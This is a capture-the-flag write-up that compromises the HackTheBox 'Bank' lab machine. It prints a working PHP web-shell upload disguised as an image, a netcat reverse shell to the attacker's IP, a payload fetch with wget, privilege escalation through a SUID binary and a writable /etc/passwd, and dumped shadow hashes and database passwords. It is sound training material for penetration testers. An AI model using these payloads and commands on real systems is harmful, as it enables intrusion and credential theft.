# Hackthebox Bank


Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.


## Recon

First, as always. we perform our initial enumeration of the box using Nmap.

```
# Nmap 7.70 scan initiated Tue Nov 13 21:33:56 2018 as: nmap -v -sV -oA bank_tcp 10.10.10.29
Nmap scan report for 10.10.10.29
Host is up (0.043s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We see three services running. A DNS server listening on tcp/53 is kind of unusual.

While enumerating these services I came up empty. I threw multiple wordlists with Gobuster on the webapplication. I enumerated the DNS without any luck. 

There is an initial hurdle on this box that we need to get past. We need to guess a piece of information, namely the dns name of the server, which is bank.htb.

Once we know this we can for example perform a DNS zone tranfer

```
root@kali:~# dig axfr bank.htb @10.10.10.29

; <<>> DiG 9.11.4-P2-3-Debian <<>> axfr bank.htb @10.10.10.29
;; global options: +cmd
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800                                                                                                     
bank.htb.               604800  IN      NS      ns.bank.htb.
bank.htb.               604800  IN      A       10.10.10.29
ns.bank.htb.            604800  IN      A       10.10.10.29
www.bank.htb.           604800  IN      CNAME   bank.htb.
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800                                                                                                     
;; Query time: 35 msec
;; SERVER: 10.10.10.29#53(10.10.10.29)
;; WHEN: tis nov 13 22:40:35 CET 2018
;; XFR size: 6 records (messages 1, bytes 171)
```

Now we could also play around with the Virutal host routing of the web application. If we specify bank.htb in our Host header we get a login page instead of the default Apache page.

Once we specify the dns name and IP of the box in our /etc/hosts file we can browse to the loginpage without any fuzz.

So when I see a login page I usually just try some simple combinations of usernames and password like admin/admin etc. 

Next I tried to run sqlmap against the login but that did not find any injections.


### Content Discovery

Running Gobuster against the site with a couple of different wordlists, the follwing produced some interesting output:

```
root@kali:~/htb/bank# gobuster -u http://bank.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                                           

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://bank.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2018/12/02 20:25:27 Starting gobuster
=====================================================
/uploads (Status: 301)
/assets (Status: 301)
/inc (Status: 301)
/server-status (Status: 403)
/balance-transfer (Status: 301)
=====================================================
2018/12/02 20:41:48 Finished
=====================================================
```

The folder "/balance-transfer" seems interesting. It contains a lot of files with encrypted data such as "Full Name", "Email" and Password.

There are way too many files to check manually, but by sorting all the files on size I noted the following contents of the file that was the smallest one:


```
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```


## Initial Compromise

Using the found credentials, I was able to log in to the bank application.

Inside there is a function to upload files.

If I try to uploada shell I get the followin message: "You cant upload this this file. You can upload only images.". However in the source of the page we see the following comments:

`<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->`

So all we have to do is to us the .htb extension on our shell:

Upload POST-request:

```
POST /support.php HTTP/1.1
Host: bank.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://bank.htb/support.php
Content-Type: multipart/form-data; boundary=---------------------------10614131861911989917853390849
Content-Length: 2373
Cookie: HTBBankAuth=de629vvhlpbl3ngphujdaj5tr0
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------10614131861911989917853390849
Content-Disposition: form-data; name="title"

asdasd
-----------------------------10614131861911989917853390849
Content-Disposition: form-data; name="message"

heheheheh
-----------------------------10614131861911989917853390849
Content-Disposition: form-data; name="fileToUpload"; filename="test.htb"
Content-Type: image/png

�PNG
IHDR,ns.adobe.com/xap/1.0/mm/" xmlns:stRef="http://ns.adobe.com/xap/1.0/sType/ResourceRef#" xmlns:xmp="http://ns.adobe.com/xap/1.0/" xmpMM:OriginalDocumentID="xmp.did:614A3E598E8EE811B93896E73AABE993" xmpMM:DocumentID="xmp.did:326653EE8E9111E8B5E9D137C25DF9B9" xmpMM:InstanceID="xmp.iid:326653ED8E9111E8B5E9D137C25DF9B9" xmp:CreatorTool="Adobe Photoshop CS6 (Windows)"> <xmpMM:DerivedFrom stRef:instanceID="xmp.iid:674A3E598E8EE811B93896E73AABE993" stRef:documentID="xmp.did:614A3E598E8EE811B93896E73AABE993"/> </rdf:Description> </rdf:RDF> </x:xmpmeta> <?xpacket end="r"?>�Z

<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
-----------------------------10614131861911989917853390849
Content-Disposition: form-data; name="submitadd"


-----------------------------10614131861911989917853390849--

```

Then we visit our uploaded file and we have code execution.

http://bank.htb/uploads/test.htb?cmd=id

```
‰PNG  IHDR,Zuv[‹tEXtSoftwareAdobe ImageReadyqÉe<fiTXtXML:com.adobe.xmp ÙZ†IDATxÚbüÿÿ?Ã`LdêûÅèbØØè <Ü\&„ÄgD“cD“Ãeù*4µhúÀr,ÂˆD3âÇ§—jQ 2,Í×ø|Ç@†Yûwñê³ =yöá?RšÀ*ÄDôˆC0WB1¼ÿð Lï9|»Mž^˜Z\(ñ,ÑñŸˆÄþMþ?ŒñŸ³`QÉŽ”Àg!)”B³t?”Þƒ-'á®¢Ž+Ÿ@Æ Ea9‘Ñ ˆÆÿO‚<`8ìß ‹ÁåÒÛ4y\–ãÐË€Ía¸ïÆ¢ù.µJ8BXy¸£ˆq0Ö•„ª£ÓD”IØÊ§U$”_èfíÆç( 6E«TŸ!å0|…êY¹ï?ÞÜKf¡‡ž`gâIÐÿÑ2¡t…} |âÃÐÂWÁ€ §Y7ž%®Ý‚æÃ¿ÿþG„Bê?PÄrÆøÌ‚å>”8þøé;+ËkNNV1¨Ð) 6£[öC¯¤qøTZÒ£‡˜‰*¡o"§™XÒÏ;•ð"Œ$È»bkÛªÄ¥n7µ» dˆÝÈ­jµ(]´ \Ä®Ä´p5úÊIÈ‰gHÌ©Dºï?BxH& ‰”¤øG²B6ËGÕø‰î ¢ß‚MN@Ÿ™ 8•RÓ_ž ÀÚg>¨-'Á\dµï)MY,dÒ+¨‡”€ø.”ÍL§œ`2˜³!R YBÙâPþ]*–U°”FT×ŸxÐIÍÀÂVÀc¼|ý™A\”Wöu¸S©583” x¬±

uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Establish Foothold

The first thing I usually do when I have an initial foothold on a system is to upgrade our shell. This is because some tasks and exploits during our privesc phase may require a full TTY to work. Trust me, I have learned this the hard way.

We can use netcat to spawn a reverse shell back to us.

http://bank.htb/uploads/test.htb?cmd=nc%20-e%20/bin/sh%2010.10.14.9%201234

```
root@kali:~/htb/bank# nc -lvp 1234
listening on [any] 1234 ...
connect to [10.10.14.9] from bank.htb [10.10.10.29] 39756
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We can then use Python to upgrade that shell to a tty:

```
python -c "import pty;pty.spawn('/bin/bash')"
www-data@bank:/var/www/bank/uploads$ 
```

## Privilege Escalation

A typical Linux privilege escalation method is based on one of the following:

1. Exploiting services running as root
2. Exploiting SUID executables
3. Exploiting SUDO rights/user
4. Exploiting badly configured cron jobs
5. Exploiting users with "." in their path
6. Kernel Exploits

Kernel exploits are typically our last resort, as there is a risk that we crash the system in the process. 

There are several scripts that automates this process for us.

So I go to /dev/shm and upload a privsc script called LinEnum.

```

www-data@bank:/home/chris$ cd /dev/shm
cd /dev/shm
www-data@bank:/dev/shm$ wget http://10.10.14.9:8000/LinEnum.sh
wget http://10.10.14.9:8000/LinEnum.sh
--2018-12-02 23:04:58--  http://10.10.14.9:8000/LinEnum.sh
Connecting to 10.10.14.9:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 47066 (46K) [text/x-sh]
Saving to: 'LinEnum.sh'

100%[======================================>] 47,066      --.-K/s   in 0.1s

2018-12-02 23:04:58 (422 KB/s) - 'LinEnum.sh' saved [47066/47066]

www-data@bank:/dev/shm$ chmod +x LinEnum.sh
chmod +x LinEnum.sh
www-data@bank:/dev/shm$
```

And the output of the script gives us a couple of interesting findings.

### SUID file permissions

Checking the following output, at the top we see a file called emergency that has the SUID bit set and is owned by root.

```
[-] SUID files:
-rwsr-xr-x 1 root root 112204 Jun 14  2017 /var/htb/bin/emergency
-rwsr-xr-x 1 root root 5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 492972 Aug 11  2016 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 333952 Dec  7  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 9808 Nov 24  2015 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 daemon daemon 46652 Oct 21  2013 /usr/bin/at
-rwsr-xr-x 1 root root 35916 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 45420 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 44620 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 18168 Nov 24  2015 /usr/bin/pkexec
-rwsr-xr-x 1 root root 30984 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 18136 May  8  2014 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 66284 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 156708 May 29  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 72860 Oct 21  2013 /usr/bin/mtr
-rwsr-sr-x 1 libuuid libuuid 17996 Nov 24  2016 /usr/sbin/uuidd
-rwsr-xr-- 1 root dip 323000 Apr 21  2015 /usr/sbin/pppd
-rwsr-xr-x 1 root root 38932 May  8  2014 /bin/ping
-rwsr-xr-x 1 root root 43316 May  8  2014 /bin/ping6
-rwsr-xr-x 1 root root 35300 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 30112 May 15  2015 /bin/fusermount
-rwsr-xr-x 1 root root 88752 Nov 24  2016 /bin/mount
-rwsr-xr-x 1 root root 67704 Nov 24  2016 /bin/umount
```
Running that file gives us a root shell.

```
www-data@bank:/var/htb/bin$ ./emergency
./emergency
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
```

### Abusing write filepermission on /etc/passwd

There is also another interesting finding in the script output:

```
[-] Can we read/write sensitive files:
-rw-rw-rw- 1 root root 1252 May 28  2017 /etc/passwd
-rw-r--r-- 1 root root 707 May 28  2017 /etc/group
-rw-r--r-- 1 root root 665 Feb 20  2014 /etc/profile
-rw-r----- 1 root shadow 895 Jun 14  2017 /etc/shadow
```
We have write access to the passwd file. This means that we can edit the file and assign a password of our choice to the root user: 

We create an encrypted password with openssl:

```
www-data@bank:/var$ openssl passwd hacker123
openssl passwd hacker123
Warning: truncating password to 8 characters
5J8cCAObXpe6Y
```

Edit the passwd file to `root:5J8cCAObXpe6Y:0:0:root:/root:/bin/bash`

```
www-data@bank:/var$ su root
Password: 
root@bank:/var# id
uid=0(root) gid=0(root) groups=0(root)
root@bank:/var# 
```

## Dumping credentials

After owning a box I usually try to dump any crendentials.

The shadowfile:
```
root@bank:/var# cat /etc/shadow
root:$6$FCg1BF62$e7YBRYXSLEOtVNayn2YGtIr1bXxsEMv.sIVc9XSKKeO..BxK1AGzEbQ2KjnvEOcrgcDrmBZyJOZpLs6KXhyYv/:17331:0:99999:7:::
daemon:*:17016:0:99999:7:::
bin:*:17016:0:99999:7:::
sys:*:17016:0:99999:7:::
sync:*:17016:0:99999:7:::
games:*:17016:0:99999:7:::
man:*:17016:0:99999:7:::
lp:*:17016:0:99999:7:::
mail:*:17016:0:99999:7:::
news:*:17016:0:99999:7:::
uucp:*:17016:0:99999:7:::
proxy:*:17016:0:99999:7:::
www-data:*:17016:0:99999:7:::
backup:*:17016:0:99999:7:::
list:*:17016:0:99999:7:::
irc:*:17016:0:99999:7:::
gnats:*:17016:0:99999:7:::
nobody:*:17016:0:99999:7:::
libuuid:!:17016:0:99999:7:::
syslog:*:17016:0:99999:7:::
messagebus:*:17314:0:99999:7:::
landscape:*:17314:0:99999:7:::
chris:$6$XOqrshKh$RiXRROT/59.YlrSb1TjzxLXxia2e4uPG6IlVM7GAFtrMuahBoMT.ltJ9Ijb.F9.2waOoQOtUrkThSKkbOhmel/:17331:0:99999:7:::
sshd:*:17314:0:99999:7:::
bind:*:17314:0:99999:7:::
mysql:!:17314:0:99999:7:::
```

I also found some database credentials used in the application, in the followin file "/var/www/bank/inc/user.php"

```
function getCreditCards($username){
                $mysql = new mysqli("localhost", "root", "!@#S3cur3P4ssw0rd!@#", "htbbank");
                $username = $mysql->real_escape_string($username);
                $result = $mysql->query("SELECT * FROM creditcards WHERE username = '$username'");
```